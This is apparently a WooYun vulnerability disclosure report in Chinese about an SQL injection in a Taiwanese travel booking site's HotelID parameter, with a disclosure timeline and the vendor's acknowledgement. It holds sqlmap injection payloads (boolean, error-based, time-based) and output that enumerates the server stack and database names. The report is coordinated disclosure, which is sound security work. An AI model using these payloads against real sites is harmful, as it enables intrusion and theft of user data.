wybug_title: 數位環球休閒網SQL注射涉及8万用户信息（臺灣地區）
wybug_status: 已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-15：	细节已通知厂商并且等待厂商处理中									2015-12-15：	厂商已经确认，细节仅向厂商公开									2015-12-25：	细节向核心白帽子及相关领域专家公开									2016-01-04：	细节向普通白帽子公开									2016-01-14：	细节向实习白帽子公开									2016-01-28：	细节向公众公开  简要描述： 數位環球休閒網sql注射 详细说明：  數位環球休閒網sql注射链接:http://**.**.**.**/frontend/fl/1/index.php?HotelID=513注入参数：    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: HotelID=513 AND (SELECT * FROM (SELECT(SLEEP(5)))LQXv)---   漏洞证明：  Parameter: HotelID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: HotelID=513 AND 7843=7843    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: HotelID=513 AND (SELECT 8017 FROM(SELECT COUNT(*),CONCAT(0x71716b7071,(SELECT (ELT(8017=8017,1))),0x717a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: HotelID=513 AND (SELECT * FROM (SELECT(SLEEP(5)))LQXv)---[15:52:57] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Red Hat Enterprise 5 (Tikanga)web application technology: Apache 2.2.3, PHP 5.2.9back-end DBMS: MySQL 5.0[15:52:57] [INFO] fetching database names[15:52:58] [INFO] the SQL query used returns 4 entries[15:52:58] [INFO] retrieved: information_schema[15:52:58] [INFO] retrieved: honet_gototravel[15:52:58] [INFO] retrieved: test_eisai[15:52:58] [INFO] retrieved: test_gototravelavailable databases [4]:[*] honet_gototravel[*] information_schema[*] test_eisai[*] test_gototravel

   修复方案：  参数过滤!   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-12-15 23:49 厂商回复： 感謝通報 最新状态： 暂无
